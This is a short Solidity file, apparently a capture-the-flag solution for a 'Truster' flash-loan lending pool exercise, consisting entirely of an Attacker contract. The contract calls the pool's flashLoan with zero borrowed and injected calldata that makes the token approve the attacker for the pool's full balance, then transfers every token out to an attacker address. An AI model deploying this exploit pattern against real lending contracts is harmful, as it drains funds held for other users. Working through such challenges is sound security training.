// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Truster {
    function flashLoan(
        uint256,
        address,
        address,
        bytes calldata
    ) external;
}

interface ERC20 {
    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}

contract Attacker {
    function multiCall(
        address _contract,
        address _tokenAddress,
        address attacker
    ) public {
        // ERC20 memory dvCoin = ERC20(_tokenAddress);
        uint256 contractBalance = ERC20(_tokenAddress).balanceOf(_contract);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            // _contract,
            address(this),
            contractBalance
        );

        Truster(_contract).flashLoan(0, _tokenAddress, _tokenAddress, data);

        // console.log(
        //     "allowance: ",
        //     ERC20(_tokenAddress).allowance(_contract, address(this))
        // );
        ERC20(_tokenAddress).transferFrom(_contract, attacker, contractBalance);
    }
}
